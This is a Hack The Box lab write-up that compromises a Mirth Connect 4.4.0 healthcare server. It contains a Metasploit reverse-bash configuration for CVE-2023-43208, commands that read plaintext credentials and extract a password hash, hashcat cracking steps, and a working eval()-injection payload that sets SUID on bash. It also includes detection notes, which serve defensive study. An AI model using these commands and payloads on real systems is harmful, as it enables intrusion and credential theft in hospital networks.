---
title: "HTB Interpreter — Mirth Connect deserialization to a root eval() sink"
date: 2026-05-18
platform: Hack The Box
difficulty: Medium
os: Linux
category: Offense
summary: "Pre-auth RCE in a healthcare integration engine, a PBKDF2 hash that only cracks with the right iteration count, and a root-owned Flask service that evaluates patient names as Python."
tags: [mirth-connect, cve-2023-43208, xstream, pbkdf2, hashcat, eval-injection, flask]
attack: [T1190, T1059.004, T1552.001, T1110.002, T1068, T1548.001]
ports: ["22/ssh", "80/http", "443/https", "6661/mllp"]
cves:
  - { id: CVE-2023-43208, severity: Critical }
tools: [nmap, curl, Metasploit, tcpdump, mysql, hashcat]
attackPath:
  - label: "Fingerprint Mirth Connect 4.4.0"
    anchor: "reconnaissance"
    access: "None"
    command: "curl -sk http://interpreter.htb/webstart.jnlp"
    detect: "A full port scan, then a request for /webstart.jnlp from an address that never loads the rest of the admin client."
  - label: "XStream deserialization RCE"
    anchor: "initial-access-%E2%80%94-cve-2023-43208"
    access: "Shell as mirth"
    technique: "T1190"
    command: "use exploit/multi/http/mirth_connect_cve_2023_43208"
    detect: "An unauthenticated POST to /api/users with an XML body, then the Mirth Java process spawning a shell with an outbound connection. Java spawning bash is the reliable signal."
  - label: "mirth.properties to MariaDB"
    anchor: "credential-extraction"
    access: "mirth, with database credentials"
    technique: "T1552.001"
    command: "cat /usr/local/mirthconnect/conf/mirth.properties"
    detect: "The service account reading its own config looks normal. An interactive mysql session as mirthdb querying PERSON_PASSWORD does not; database audit logging would show it."
  - label: "Crack the PBKDF2 hash"
    anchor: "cracking-the-hash-%E2%80%94-the-detail-that-matters"
    access: "SSH as sedric"
    technique: "T1110.002"
    command: "hashcat -m 10900 mirth.hash rockyou.txt"
    detect: "Cracking is offline. The visible event is a first SSH login for sedric from an unfamiliar source address."
  - label: "eval() sink in a root service"
    anchor: "privilege-escalation-%E2%80%94-python-f-string-into-eval()"
    access: "root"
    technique: "T1068"
    command: "<firstname>{os.system('/tmp/pwn.sh')}</firstname>"
    detect: "A POST to 127.0.0.1:54321/addPatient that did not come from the Mirth channel, a root-owned Python service running a script from /tmp, and /bin/bash gaining the SUID bit."
---

Interpreter is built around **Mirth Connect 4.4.0**, NextGen Healthcare's open-source HL7 integration engine. It's a realistic target: Mirth sits in a lot of hospital networks, and the vulnerabilities on this box are the kind that actually show up there — an unauthenticated deserialization bug, plaintext database credentials in a config file, and a home-grown notification service with an `eval()` in it.

**Attack path**

```
Mirth Connect 4.4.0 (80/443)
  → CVE-2023-43208: unauthenticated XStream deserialization → shell as mirth
  → mirth.properties → MariaDB credentials
  → PERSON_PASSWORD table → PBKDF2 hash for user sedric
  → hashcat -m 10900 with 600,000 iterations → SSH as sedric
  → notif.py (Flask, root, 127.0.0.1:54321) → f-string into eval() → SUID bash → root
```

## Reconnaissance

```bash
nmap -sC -sV -p- --min-rate 5000 -oN interpreter.nmap interpreter.htb
```

| Port | Service | Detail |
|---|---|---|
| 22 | SSH | OpenSSH 9.2p1 Debian |
| 80 | HTTP | Jetty — Mirth Connect Administrator |
| 443 | HTTPS | Jetty — Mirth Connect Administrator (self-signed) |
| 6661 | TCP | Mirth HL7 MLLP listener |

Port 6661 is a tell on its own — MLLP is the transport HL7 messages ride on, and it narrows the target to a healthcare integration product immediately. Mirth also hands you its version in the Java Web Start descriptor:

```bash
curl -sk http://interpreter.htb/webstart.jnlp
# <title>Mirth Connect Administrator 4.4.0</title>
```

## Initial access — CVE-2023-43208

CVE-2023-43208 is a bypass of the patch for CVE-2023-37679. Mirth deserializes the XML body of requests to `/api/users` with XStream *before* authentication is enforced, so a crafted payload using the Commons Lang3 `EventUtils` gadget chain executes with the privileges of the `mirth` service user.

I used the Metasploit module for speed:

```
use exploit/multi/http/mirth_connect_cve_2023_43208
set RHOSTS interpreter.htb
set RPORT 443
set SSL true
set payload cmd/unix/reverse_bash
set LHOST <tun0>
set LPORT 4444
run
```

Two things worth knowing from this step:

- The default `meterpreter/reverse_tcp` payload stages a binary over HTTP from your box. Outbound traffic from the target was filtered, so it failed silently. `cmd/unix/reverse_bash` is inline and worked. I confirmed the egress filter with `tcpdump -i tun0 icmp` and no replies.
- The usual `stty raw -echo; fg` upgrade destroys an MSF session's terminal. Work in the plain shell or use `sessions -u`.

Shell as `mirth`.

## Credential extraction

Mirth keeps its database credentials in plaintext:

```bash
cat /usr/local/mirthconnect/conf/mirth.properties
```

```
database = mysql
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod
database.username = mirthdb
database.password = ************
keystore.storepass = ************
keystore.keypass = ************
```

```bash
mysql -u mirthdb -p -h 127.0.0.1 mc_bdd_prod -A
SELECT * FROM PERSON;
SELECT * FROM PERSON_PASSWORD;
```

User `sedric` had a base64 password hash in `PERSON_PASSWORD`. The `CHANNEL` table was also worth reading in full: a channel named `INTERPRETER - HL7 TO XML TO NOTIFY` listened on 6661, transformed HL7 to XML, and POSTed it to `http://127.0.0.1:54321/addPatient`. That's the privilege-escalation target, announced in advance.

## Cracking the hash — the detail that matters

The stored value decodes to 40 bytes: an 8-byte salt followed by a 32-byte PBKDF2-HMAC-SHA256 derived key.

```python
import base64
data = base64.b64decode('<hash from PERSON_PASSWORD>')
salt, key = data[:8], data[8:]
```

The thing that stalls most people here is the iteration count. Mirth 4.4.0 changed the default from 1,000 to **600,000** iterations (it's in the [4.4.0 upgrade guide](https://github.com/nextgenhealthcare/connect/wiki/4.4.0---Upgrade-Guide)). With the wrong count, no wordlist will ever crack it.

```bash
# hashcat mode 10900 format: sha256:<iterations>:<salt_b64>:<key_b64>
echo 'sha256:600000:<salt_b64>:<key_b64>' > mirth.hash
hashcat -m 10900 mirth.hash /usr/share/wordlists/rockyou.txt
```

It cracked. SSH as `sedric`, user flag.

## Privilege escalation — Python f-string into eval()

`/usr/local/bin/notif.py` runs as root and listens on `127.0.0.1:54321`. The relevant function:

```python
def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old..."
    return eval(f"f'''{template}'''")   # <-- sink
```

The allow-list regex blocks spaces but permits `{`, `}`, `(`, `)`, `.`, `'` and `/`. User input is interpolated into an f-string that is then passed to `eval()`, so any `{expression}` in a patient name is evaluated as Python — as root. Spaces are blocked, so the command goes in a script file:

```bash
echo 'chmod u+s /bin/bash' > /tmp/pwn.sh && chmod +x /tmp/pwn.sh

python3 - <<'EOF'
import urllib.request
xml = b"""<patient>
  <firstname>{os.system('/tmp/pwn.sh')}</firstname>
  <lastname>Doe</lastname>
  <sender_app>TEST</sender_app>
  <timestamp>20260101120000</timestamp>
  <birth_date>01/01/1990</birth_date>
  <gender>M</gender>
</patient>"""
req = urllib.request.Request('http://127.0.0.1:54321/addPatient', data=xml, headers={'Content-Type': 'text/xml'})
urllib.request.urlopen(req)
EOF

/bin/bash -p
```

Root.

## Vulnerabilities

| Issue | Classification |
|---|---|
| Unauthenticated RCE via XStream deserialization in Mirth Connect ≤ 4.4.0 | CVE-2023-43208 / CWE-502 |
| Plaintext database and keystore credentials in `mirth.properties` | CWE-256 |
| User-controlled input evaluated with `eval()` in a root service | CWE-95 |
| Root-privileged service bound to localhost with no authentication | CWE-306 |

## What I took away

- Fingerprint Mirth from the JNLP file; it tells you the exact version.
- When reverse shells fail, suspect egress filtering before suspecting the exploit. Inline payloads and bind shells get around it.
- **Verify the KDF parameters before you crack anything.** Iteration count, salt length, and salt position all have to be right, and the vendor's upgrade notes are where those details live.
- A localhost-only service running as root is one of the most common real-world privesc paths. `ss -tlnp` right after landing.
- `eval()` on anything derived from user input is code execution, regardless of how strict the regex in front of it looks.
- When `curl` isn't on the box, `urllib.request` does everything you need.

## References

- [CVE-2023-43208 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-43208)
- [Horizon3 — Writeup for CVE-2023-43208](https://www.horizon3.ai/attack-research/attack-blogs/writeup-for-cve-2023-43208-nextgen-mirth-connect-pre-auth-rce/)
- [Mirth Connect 4.4.0 upgrade guide](https://github.com/nextgenhealthcare/connect/wiki/4.4.0---Upgrade-Guide)
